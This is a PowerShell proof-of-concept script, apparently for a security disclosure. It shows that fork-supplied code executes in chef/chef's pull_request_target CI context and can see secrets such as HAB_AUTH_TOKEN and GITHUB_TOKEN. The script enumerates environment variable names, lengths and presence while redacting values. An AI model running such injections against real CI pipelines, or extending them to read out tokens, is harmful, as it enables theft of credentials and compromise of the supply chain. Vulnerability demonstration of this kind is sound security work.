# Non-destructive PoC for FINDING-GH-009 (chef/chef V1B).
# Replaces fork's `.expeditor/scripts/ensure-minimum-viable-hab.ps1`.
#
# Demonstrates ONLY:
#   - fork-controlled PowerShell script executes in PRT context
#   - identity (whoami / hostname)
#   - presence of HAB_AUTH_TOKEN, GITHUB_TOKEN, etc. (KEY NAMES + LENGTH ONLY,
#     values fully redacted)
#   - github.workspace path = fork content
#
# DOES NOT:
#   - print any secret value
#   - perform network egress to non-github hosts
#   - modify host state outside this process
#   - install Habitat (the original script's purpose)
#
# Tear-down: operator closes PR; this script is never merged.

$ErrorActionPreference = 'Continue'

Write-Host "::group::FINDING-GH-009 PoC — fork-controlled PowerShell exec in PRT context"

Write-Host "[POC] whoami:           $(whoami)"
Write-Host "[POC] hostname:         $(hostname)"
Write-Host "[POC] runner os/arch:   $env:RUNNER_OS / $env:RUNNER_ARCH"
Write-Host "[POC] github.workspace: $env:GITHUB_WORKSPACE"
Write-Host "[POC] script path:      $PSCommandPath"
Write-Host "[POC] fork content marker: $(if (Test-Path $env:GITHUB_WORKSPACE\.poc-marker.txt) { Get-Content $env:GITHUB_WORKSPACE\.poc-marker.txt -Raw } else { 'absent' })"

Write-Host ""
Write-Host "[POC] env keys of interest (values fully REDACTED):"
$keysOfInterest = @('HAB_', 'GITHUB_', 'ACTIONS_', 'RUNNER_', 'CI', 'GH_')
Get-ChildItem env: | Sort-Object Name | ForEach-Object {
    foreach ($prefix in $keysOfInterest) {
        if ($_.Name.StartsWith($prefix) -or $_.Name -eq 'CI') {
            $valueLen = if ($_.Value) { $_.Value.Length } else { 0 }
            Write-Host ("  {0,-40} = <REDACTED length={1}>" -f $_.Name, $valueLen)
            break
        }
    }
}

Write-Host ""
Write-Host "[POC] PRESENCE of secrets-derived env vars (boolean):"
foreach ($v in @('HAB_AUTH_TOKEN', 'GITHUB_TOKEN', 'ACTIONS_ID_TOKEN_REQUEST_TOKEN', 'ACTIONS_ID_TOKEN_REQUEST_URL')) {
    $present = if ([Environment]::GetEnvironmentVariable($v)) { 'YES' } else { 'no' }
    Write-Host ("  {0,-40} = {1}" -f $v, $present)
}

Write-Host "::endgroup::"

# Always exit 0 — PoC must not break the test workflow.
exit 0
